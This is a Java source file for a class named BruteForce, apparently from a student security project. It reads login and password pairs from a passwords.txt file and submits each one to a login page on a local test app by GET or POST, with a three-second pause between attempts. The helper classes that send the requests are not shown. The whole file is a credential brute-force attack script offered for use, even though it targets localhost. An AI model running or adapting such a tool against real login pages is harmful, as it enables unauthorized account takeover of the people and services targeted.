
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import static java.lang.Thread.sleep;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Scanner;
import org.omg.CORBA.NameValuePair;

public class BruteForce {

    public static void main(String[] args) throws MalformedURLException, IOException, InterruptedException {
        String url = "http://127.0.0.1:80/ProjetSecu/PROJET_SECURITE_PHP_MYSQL/index.php";
        MakeHttpQuery http_q = new MakeHttpQuery();
        http_q.setURL(url);
        File file;
        file = new File("passwords.txt");
        BufferedReader br = new BufferedReader(new FileReader(file));
        String line;
        String login_pass[] = new String[2];
        System.out.println("choose the http method  ");
        Scanner scanner = new Scanner(System.in);
        String http_method = scanner.nextLine();
        while ((line = br.readLine()) != null) {
            login_pass = ReadingLoginPasswords.reading_password_login(line);

            http_q.setLogin(login_pass[0]);
            http_q.setPassword(login_pass[1]);
            if (http_method.equals("get")) {
                http_q.doGet();
            } else {
                http_q.doPost();
            }

            sleep(3000);
        }

    }

}
